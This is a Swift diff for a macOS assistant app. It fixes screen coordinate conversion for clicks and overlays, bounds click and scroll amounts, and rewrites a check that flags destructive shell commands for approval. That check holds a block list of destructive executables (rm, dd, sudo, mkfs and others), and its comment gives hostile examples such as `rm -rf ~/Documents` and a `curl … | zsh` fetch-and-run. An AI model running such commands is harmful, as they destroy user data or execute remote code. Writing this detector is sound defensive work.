+/// origins with y increasing upward (`NSScreen.frame`, `NSPanel` frames, `NSEvent.mouseLocation`).
+/// Panels are positioned in AppKit space even when the rect came from Vision or CG, so every
+/// crossing goes through this type instead of assuming the two spaces are the same.
+struct ScreenCoordinateSpace: Equatable, Sendable {
+    /// AppKit frame of the primary display, whose bottom-left corner is the AppKit origin.
+    let primaryFrame: CGRect
+    /// AppKit frame of the display that owns the converted coordinates.
+    let screenFrame: CGRect
+
+    init(primaryFrame: CGRect, screenFrame: CGRect) {
+        self.primaryFrame = primaryFrame
+        self.screenFrame = screenFrame
+    }
+
+    /// The target display's bounds in CG/Vision global top-left coordinates.
+    var screenBoundsInTopLeft: CGRect {
+        CGRect(x: screenFrame.minX,
+               y: primaryFrame.maxY - screenFrame.maxY,
+               width: screenFrame.width,
+               height: screenFrame.height)
+    }
+
+    /// Flipping about the primary display's horizontal mid-line maps one global space to the other.
+    /// x is shared: both spaces grow rightward from the primary display's left edge.
+    func appKitPoint(fromTopLeft point: CGPoint) -> CGPoint {
+        CGPoint(x: point.x, y: primaryFrame.maxY - point.y)
+    }
+    func topLeftPoint(fromAppKit point: CGPoint) -> CGPoint {
+        appKitPoint(fromTopLeft: point)
+    }
+
+    func appKitRect(fromTopLeft rect: CGRect) -> CGRect {
+        CGRect(x: rect.minX, y: primaryFrame.maxY - rect.maxY, width: rect.width, height: rect.height)
+    }
+    func topLeftRect(fromAppKit rect: CGRect) -> CGRect {
+        appKitRect(fromTopLeft: rect)
+    }
+
+    /// Vision/OCR boxes are normalized to the captured image with a bottom-left origin; scaling
+    /// them by the owning display's size yields pixels local to that display with a top-left origin.
+    func screenLocalRect(fromVisionNormalized rect: CGRect) -> CGRect {
+        CGRect(x: rect.minX * screenFrame.width,
+               y: (1 - rect.maxY) * screenFrame.height,
+               width: rect.width * screenFrame.width,
+               height: rect.height * screenFrame.height)
+    }
+    func screenLocalPoint(fromVisionNormalized point: CGPoint) -> CGPoint {
+        CGPoint(x: point.x * screenFrame.width, y: (1 - point.y) * screenFrame.height)
+    }
+
+    /// A rect in the target display's local top-left pixels to that display's AppKit global frame.
+    func appKitRect(fromScreenTopLeftLocal rect: CGRect) -> CGRect {
+        let origin = screenBoundsInTopLeft.origin
+        return appKitRect(fromTopLeft: rect.offsetBy(dx: origin.x, dy: origin.y))
+    }
+
+    /// A Vision/OCR box straight to AppKit global coordinates, for panel placement.
+    func appKitRect(fromVisionNormalized rect: CGRect) -> CGRect {
+        appKitRect(fromScreenTopLeftLocal: screenLocalRect(fromVisionNormalized: rect))
+    }
+}
+
+#if canImport(AppKit)
+extension ScreenCoordinateSpace {
+    /// AppKit frame of the primary (menu bar) display; its origin is (0, 0).
+    @MainActor
+    static func primaryFrame() -> CGRect {
+        let screens = NSScreen.screens
+        return (screens.first(where: { $0.frame.origin == .zero }) ?? screens.first)?.frame
+            ?? CGRect(x: 0, y: 0, width: 1440, height: 900)
+    }
+
+    @MainActor
+    static func current() -> ScreenCoordinateSpace {
+        ScreenCoordinateSpace(primaryFrame: primaryFrame(), screenFrame: NSScreen.main?.frame ?? primaryFrame())
+    }
+
+    @MainActor
+    static func current(for screen: NSScreen?) -> ScreenCoordinateSpace {
+        ScreenCoordinateSpace(primaryFrame: primaryFrame(), screenFrame: screen?.frame ?? NSScreen.main?.frame ?? primaryFrame())
+    }
+
+    /// Space of the display that contains `point` in CG/Vision global top-left coordinates.
+    @MainActor
+    static func current(containing point: CGPoint) -> ScreenCoordinateSpace {
+        let primary = primaryFrame()
+        for screen in NSScreen.screens {
+            let candidate = ScreenCoordinateSpace(primaryFrame: primary, screenFrame: screen.frame)
+            if candidate.screenBoundsInTopLeft.contains(point) { return candidate }
+        }
+        return current()
+    }
+
+    @MainActor
+    static func current(containing rect: CGRect) -> ScreenCoordinateSpace {
+        current(containing: CGPoint(x: rect.midX, y: rect.midY))
+    }
+}
+#endif
 
 #if canImport(AppKit)
 @MainActor
@@ -2403,10 +2687,13 @@ public final class ScreenGuideLaserOverlay {
 
     private init() {}
 
+    /// `point` is in CG/Vision global top-left coordinates (`CGEvent`/`CGWarpMouseCursorPosition`
+    /// space); the panel frame is converted to AppKit bottom-left space for the owning display.
     public func showPointer(at point: CGPoint, duration: TimeInterval = 2.5) {
         dismiss()
         let size: CGFloat = 80
-        let frame = NSRect(x: point.x - size / 2, y: point.y - size / 2, width: size, height: size)
+        let center = ScreenCoordinateSpace.current(containing: point).appKitPoint(fromTopLeft: point)
+        let frame = NSRect(x: center.x - size / 2, y: center.y - size / 2, width: size, height: size)
         let panel = NSPanel(
             contentRect: frame,
             styleMask: [.borderless, .nonactivatingPanel],
@@ -2435,7 +2722,9 @@ public final class ScreenGuideLaserOverlay {
 
     public func highlightRect(_ rect: CGRect, duration: TimeInterval = 3.0) {
         dismiss()
-        let inset = rect.insetBy(dx: -8, dy: -8)
+        // Callers pass CG/Vision top-left global coordinates; panels need AppKit bottom-left space.
+        let appKit = ScreenCoordinateSpace.current(containing: rect).appKitRect(fromTopLeft: rect)
+        let inset = appKit.insetBy(dx: -8, dy: -8)
         let panel = NSPanel(
             contentRect: inset,
             styleMask: [.borderless, .nonactivatingPanel],
@@ -3181,42 +3470,46 @@ public enum MouseControlEngine {
             return (false, "No active screen found.")
         }
         let frame = screen.frame
+        let space = ScreenCoordinateSpace.current(for: screen)
         let lower = description.lowercased().trimmingCharacters(in: .whitespacesAndNewlines)
-        let targetPoint: CGPoint
+        // Offsets are computed in AppKit screen space, then converted once to the CG top-left space
+        // that `moveMouse` and the overlay consume.
+        let appKitPoint: CGPoint
         let label: String
 
         if lower.contains("center") || lower.contains("middle") {
-            targetPoint = CGPoint(x: frame.midX, y: frame.midY)
+            appKitPoint = CGPoint(x: frame.midX, y: frame.midY)
             label = "center of the screen"
         } else if lower.contains("top left") {
-            targetPoint = CGPoint(x: frame.minX + 100, y: frame.maxY - 100)
+            appKitPoint = CGPoint(x: frame.minX + 100, y: frame.maxY - 100)
             label = "top-left of the screen"
         } else if lower.contains("top right") {
-            targetPoint = CGPoint(x: frame.maxX - 100, y: frame.maxY - 100)
+            appKitPoint = CGPoint(x: frame.maxX - 100, y: frame.maxY - 100)
             label = "top-right of the screen"
         } else if lower.contains("bottom left") {
-            targetPoint = CGPoint(x: frame.minX + 100, y: frame.minY + 100)
+            appKitPoint = CGPoint(x: frame.minX + 100, y: frame.minY + 100)
             label = "bottom-left of the screen"
         } else if lower.contains("bottom right") {
-            targetPoint = CGPoint(x: frame.maxX - 100, y: frame.minY + 100)
+            appKitPoint = CGPoint(x: frame.maxX - 100, y: frame.minY + 100)
             label = "bottom-right of the screen"
         } else if lower.contains("top") {
-            targetPoint = CGPoint(x: frame.midX, y: frame.maxY - 100)
+            appKitPoint = CGPoint(x: frame.midX, y: frame.maxY - 100)
             label = "top edge of the screen"
         } else if lower.contains("bottom") {
-            targetPoint = CGPoint(x: frame.midX, y: frame.minY + 100)
+            appKitPoint = CGPoint(x: frame.midX, y: frame.minY + 100)
             label = "bottom edge of the screen"
         } else if lower.contains("left") {
-            targetPoint = CGPoint(x: frame.minX + 100, y: frame.midY)
+            appKitPoint = CGPoint(x: frame.minX + 100, y: frame.midY)
             label = "left edge of the screen"
         } else if lower.contains("right") {
-            targetPoint = CGPoint(x: frame.maxX - 100, y: frame.midY)
+            appKitPoint = CGPoint(x: frame.maxX - 100, y: frame.midY)
             label = "right edge of the screen"
         } else {
-            targetPoint = CGPoint(x: frame.midX, y: frame.midY)
+            appKitPoint = CGPoint(x: frame.midX, y: frame.midY)
             label = "center of the screen"
         }
 
+        let targetPoint = space.topLeftPoint(fromAppKit: appKitPoint)
         let ok = moveMouse(to: targetPoint)
         if ok {
             ScreenGuideLaserOverlay.shared.showPointer(at: targetPoint, duration: 1.5)
@@ -3230,6 +3523,8 @@ public enum MouseControlEngine {
         guard InPlaceAppTyping.isAccessibilityTrusted(promptIfNeeded: true) else {
             return false
         }
+        // Each click sleeps on the main actor; bound the loop again here so no caller can freeze the UI.
+        let clicks = ToolNumericBounds.clampedClicks(clicks)
         let source = CGEventSource(stateID: .hidSystemState)
         CGWarpMouseCursorPosition(point)
         usleep(15_000)
@@ -3253,7 +3548,7 @@ public enum MouseControlEngine {
             cgButton = .center
         }
 
-        for clickIndex in 1...max(1, clicks) {
+        for clickIndex in 1...clicks {
             guard let down = CGEvent(mouseEventSource: source, mouseType: downType, mouseCursorPosition: point, mouseButton: cgButton),
                   let up = CGEvent(mouseEventSource: source, mouseType: upType, mouseCursorPosition: point, mouseButton: cgButton) else {
                 return false
@@ -3309,12 +3604,14 @@ public enum MouseControlEngine {
 
             if let matched = bestMatch {
                 let screen = NSScreen.main ?? NSScreen.screens.first
-                let screenWidth = Double(screen?.frame.width ?? 1440)
-                let screenHeight = Double(screen?.frame.height ?? 900)
-
-                let clickX = (matched.boundingBox.origin.x + matched.boundingBox.width / 2.0) * screenWidth
-                let clickY = (1.0 - (matched.boundingBox.origin.y + matched.boundingBox.height / 2.0)) * screenHeight
-                let clickPoint = CGPoint(x: clickX, y: clickY)
+                // Vision boxes are normalized to the captured display; scaling yields pixels local
+                // to that display, and the display's top-left origin makes them CG global.
+                let space = ScreenCoordinateSpace.current(for: screen)
+                let localCenter = space.screenLocalPoint(
+                    fromVisionNormalized: CGPoint(x: matched.boundingBox.midX, y: matched.boundingBox.midY)
+                )
+                let origin = space.screenBoundsInTopLeft.origin
+                let clickPoint = CGPoint(x: origin.x + localCenter.x, y: origin.y + localCenter.y)
 
                 let ok = click(at: clickPoint, button: .left, clicks: 1)
                 if ok {
@@ -3615,15 +3912,11 @@ public enum ScrollCommand: Equatable {
 public enum ScrollControlEngine {
     public static func parseCommand(_ text: String) -> ScrollCommand {
         let trimmed = text.trimmingCharacters(in: .whitespacesAndNewlines).lowercased()
-        let clean = trimmed.trimmingCharacters(in: CharacterSet(charactersIn: "?!.,:;\"'"))
+        let clean = trimConversationalPunctuation(trimmed)
 
-        let prefixes = ["can you please ", "could you please ", "please ", "can you ", "could you ", "dot "]
-        var s = clean
-        for p in prefixes {
-            if s.hasPrefix(p) {
-                s = String(s.dropFirst(p.count)).trimmingCharacters(in: .whitespacesAndNewlines)
-            }
-        }
+        let s = stripConversationalPrefixes(clean, prefixes: [
+            "can you please ", "could you please ", "please ", "can you ", "could you ", "dot "
+        ])
 
         if s == "scroll down" || s == "scroll down a bit" || s == "scroll down a little" || s == "scroll" || s == "прокрути вниз" {
             return .scroll(direction: .down, amount: 6)
@@ -3662,24 +3955,25 @@ public enum ScrollControlEngine {
     @MainActor
     public static func scroll(direction: ScrollDirection, amount: Int = 6) -> Bool {
         guard InPlaceAppTyping.isAccessibilityTrusted(promptIfNeeded: true) else { return false }
+        // Bounded again at the engine entry point: `Int32(-max(1, amount))` traps above Int32.max.
         switch direction {
         case .down:
-            let delta = Int32(-max(1, amount))
+            let delta = ToolNumericBounds.scrollDelta(amount: amount, inverted: true)
             guard let event = CGEvent(scrollWheelEvent2Source: nil, units: .line, wheelCount: 1, wheel1: delta, wheel2: 0, wheel3: 0) else { return false }
             event.post(tap: .cghidEventTap)
             return true
         case .up:
-            let delta = Int32(max(1, amount))
+            let delta = ToolNumericBounds.scrollDelta(amount: amount, inverted: false)
             guard let event = CGEvent(scrollWheelEvent2Source: nil, units: .line, wheelCount: 1, wheel1: delta, wheel2: 0, wheel3: 0) else { return false }
             event.post(tap: .cghidEventTap)
             return true
         case .left:
-            let delta = Int32(max(1, amount))
+            let delta = ToolNumericBounds.scrollDelta(amount: amount, inverted: false)
             guard let event = CGEvent(scrollWheelEvent2Source: nil, units: .line, wheelCount: 2, wheel1: 0, wheel2: delta, wheel3: 0) else { return false }
             event.post(tap: .cghidEventTap)
             return true
         case .right:
-            let delta = Int32(-max(1, amount))
+            let delta = ToolNumericBounds.scrollDelta(amount: amount, inverted: true)
             guard let event = CGEvent(scrollWheelEvent2Source: nil, units: .line, wheelCount: 2, wheel1: 0, wheel2: delta, wheel3: 0) else { return false }
             event.post(tap: .cghidEventTap)
             return true
@@ -4011,7 +4305,9 @@ public final class ScreenScribbleTracker: @unchecked Sendable {
                (maxX - minX) > 30, (maxY - minY) > 30 {
                 let rect = CGRect(x: minX, y: minY, width: maxX - minX, height: maxY - minY)
                 Task { @MainActor in
-                    ScreenGuideLaserOverlay.shared.highlightRect(rect, duration: 0.6)
+                    // `NSEvent.mouseLocation` is AppKit bottom-left; the overlay takes CG top-left.
+                    let space = ScreenCoordinateSpace.current()
+                    ScreenGuideLaserOverlay.shared.highlightRect(space.topLeftRect(fromAppKit: rect), duration: 0.6)
                 }
             }
         }
@@ -4042,7 +4338,10 @@ public final class ScreenScribbleTracker: @unchecked Sendable {
         guard width >= 40 && height >= 40 else { return }
         let box = CGRect(x: minX, y: minY, width: width, height: height)
         Task { @MainActor [weak self] in
-            ScreenGuideLaserOverlay.shared.highlightRect(box, duration: 3.0)
+            // `box` stays in AppKit coordinates: it is hit-tested against `NSEvent.mouseLocation`
+            // and handed to callers that only read its size.
+            let space = ScreenCoordinateSpace.current()
+            ScreenGuideLaserOverlay.shared.highlightRect(space.topLeftRect(fromAppKit: box), duration: 3.0)
             self?.onCircleCompleted?(box)
         }
     }
@@ -4129,15 +4428,14 @@ public final class InteractiveWalkthroughManager {
                 let target = step.targetElementText.lowercased()
                 if let matched = lines.first(where: { $0.text.lowercased().contains(target) }) {
                     let screen = NSScreen.main ?? NSScreen.screens.first
-                    let screenWidth = Double(screen?.frame.width ?? 1440)
-                    let screenHeight = Double(screen?.frame.height ?? 900)
-                    let boxX = matched.boundingBox.origin.x * screenWidth
-                    let boxY = (1.0 - (matched.boundingBox.origin.y + matched.boundingBox.height)) * screenHeight
-                    let boxW = matched.boundingBox.width * screenWidth
-                    let boxH = matched.boundingBox.height * screenHeight
-                    let rect = CGRect(x: boxX, y: boxY, width: max(30, boxW), height: max(20, boxH))
+                    let space = ScreenCoordinateSpace.current(for: screen)
+                    var local = space.screenLocalRect(fromVisionNormalized: matched.boundingBox)
+                    local.size = CGSize(width: max(30, local.width), height: max(20, local.height))
+                    // The click monitor compares against `NSEvent.mouseLocation`, so the stored
+                    // target stays in AppKit space while the panel is placed from top-left space.
+                    let rect = space.appKitRect(fromScreenTopLeftLocal: local)
                     self.activeTargetRect = rect
-                    ScreenGuideLaserOverlay.shared.highlightRect(rect, duration: 60.0)
+                    ScreenGuideLaserOverlay.shared.highlightRect(space.topLeftRect(fromAppKit: rect), duration: 60.0)
                 }
             } catch {}
         }
@@ -4228,18 +4526,120 @@ public struct ActionApprovalRequest: Identifiable, Equatable, Sendable {
         self.command = command
     }
 
+    /// Executables whose invocation can destroy data or take over the machine. Matching is by
+    /// token basename, so `/bin/rm`, `env rm`, `rm` after any separator and quoted forms all match.
+    private static let destructiveExecutables: Set<String> = [
+        "rm", "rmdir", "srm", "dd", "mkfs", "fdisk", "diskutil", "kill", "killall", "pkill",
+        "sudo", "chmod", "chown", "mv", "trash", "shutdown"
+    ]
+    /// Shells and executors that re-introduce a hidden command in a later token.
+    private static let wrapperExecutables: Set<String> = [
+        "sh", "bash", "zsh", "dash", "ksh", "csh", "tcsh", "fish", "xargs"
+    ]
+    /// Flags that delete, or execute a command per file, inside another command.
+    private static let wrapperFlags: Set<String> = ["-exec", "-execdir", "-delete", "-ok", "-okdir"]
+    /// Characters that start a new command in POSIX shell syntax.
+    private static let commandSeparators: Set<Character> = [";", "&", "|", "(", ")", "\"", "'"]
+
     /// Evaluates whether a shell command or action is potentially destructive and requires approval.
+    /// Tokenizing (not substring matching) is what stops `/bin/rm -rf ~/Documents`, `sh -c "rm …"`,
+    /// `find . -delete`, `echo x > ~/.zshrc` and `curl https://x/i.sh | zsh` from executing silently.
     public static func isPotentiallyDestructive(_ command: String) -> Bool {
-        let lower = command.lowercased().trimmingCharacters(in: .whitespacesAndNewlines)
-        let dangerousPrefixes = [
-            "rm ", "rm\t", "rmdir", "srm",
-            "git reset", "git clean", "git checkout -f",
-            "kill ", "killall", "pkill",
-            "dd ", "mkfs", "fdisk", "diskutil",
-            "chmod", "chown", "sudo",
-            "mv ", "trash "
-        ]
-        return dangerousPrefixes.contains(where: { lower.hasPrefix($0) || lower.contains(" " + $0) || lower.contains("; " + $0) || lower.contains("&& " + $0) })
+        let tokens = shellTokens(in: command)
+        for (index, token) in tokens.enumerated() {
+            let lower = token.lowercased()
+            if wrapperFlags.contains(lower) { return true }
+            let name = basename(lower)
+            if destructiveExecutables.contains(name) { return true }
+            // A shell or executor only counts as a wrapper in command position (start of the
+            // command or right after a separator such as `|`), so `echo zsh` stays harmless.
+            if isCommandPosition(tokens, index: index), wrapperExecutables.contains(name) { return true }
+        }
+        if hasDestructiveGitInvocation(tokens) { return true }
+        // A redirect rewrites a file even when no listed executable is involved.
+        return hasUnquotedRedirect(command)
+    }
+
+    /// Splits on whitespace and shell metacharacters, keeping the metacharacters as their own
+    /// tokens so command position stays observable.
+    private static func shellTokens(in command: String) -> [String] {
+        var tokens: [String] = []
+        var current = ""
+        var escaped = false
+        func flush() {
+            if !current.isEmpty { tokens.append(current); current = "" }
+        }
+        for character in command {
+            if escaped { current.append(character); escaped = false; continue }
+            if character == "\\" { escaped = true; continue }
+            if character.isWhitespace || commandSeparators.contains(character) {
+                flush()
+                if commandSeparators.contains(character) { tokens.append(String(character)) }
+                continue
+            }
+            current.append(character)
+        }
+        flush()
+        return tokens
+    }
+
+    /// `/bin/rm` and `/usr/bin/sudo` must be judged by their executable name, not their path.
+    private static func basename(_ token: String) -> String {
+        let parts = token.split(separator: "/", omittingEmptySubsequences: true)
+        return parts.last.map(String.init) ?? token
+    }
+
+    private static func isCommandPosition(_ tokens: [String], index: Int) -> Bool {
+        guard index > 0 else { return true }
+        let previous = tokens[index - 1]
+        return previous.count == 1 && commandSeparators.contains(Character(previous))
+    }
+
+    /// `git reset`, `git clean`, `git checkout -f` and `git push --force` discard committed or
+    /// uncommitted work even though `git` itself is harmless.
+    private static func hasDestructiveGitInvocation(_ tokens: [String]) -> Bool {
+        let words = tokens.map { $0.lowercased() }
+        guard let gitIndex = words.firstIndex(where: { basename($0) == "git" }) else { return false }
+        let rest = Array(words[(gitIndex + 1)...])
+        guard let subcommand = rest.first(where: { !$0.hasPrefix("-") }) else { return false }
+        let flags = Set(rest.filter { $0.hasPrefix("-") })
+        switch basename(subcommand) {
+        case "reset", "clean":
+            return true
+        case "checkout":
+            return flags.contains("-f") || flags.contains("--force")
+        case "push":
+            return flags.contains("-f") || flags.contains("--force")
+                || flags.contains("--force-with-lease") || flags.contains("--force-if-includes")
+        default:
+            return false
+        }
+    }
+
+    /// True for a `>`/`>>` write outside quotes. File-descriptor duplication (`2>&1`, `>&-`) is
+    /// not a write and stays allowed.
+    private static func hasUnquotedRedirect(_ command: String) -> Bool {
+        let characters = Array(command)
+        var singleQuoted = false
+        var doubleQuoted = false
+        var escaped = false
+        var index = 0
+        while index < characters.count {
+            let character = characters[index]
+            if escaped { escaped = false; index += 1; continue }
+            if character == "\\" { escaped = true; index += 1; continue }
+            if character == "'" && !doubleQuoted { singleQuoted.toggle(); index += 1; continue }
+            if character == "\"" && !singleQuoted { doubleQuoted.toggle(); index += 1; continue }
+            if character == ">", !singleQuoted, !doubleQuoted {
+                if index + 2 < characters.count, characters[index + 1] == "&" {
+                    let after = characters[index + 2]
+                    if after.isNumber || after == "-" { index += 1; continue }
+                }
+                return true
+            }
+            index += 1
+        }
+        return false
     }
 }
 
